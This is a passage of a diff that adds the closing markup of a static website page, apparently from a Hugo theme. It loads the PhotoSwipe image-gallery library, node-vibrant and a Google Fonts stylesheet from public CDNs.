+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.799eb5847effe83ae252baf7b2236f0c3752b0188dd0985faa7efc75ea805b29.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
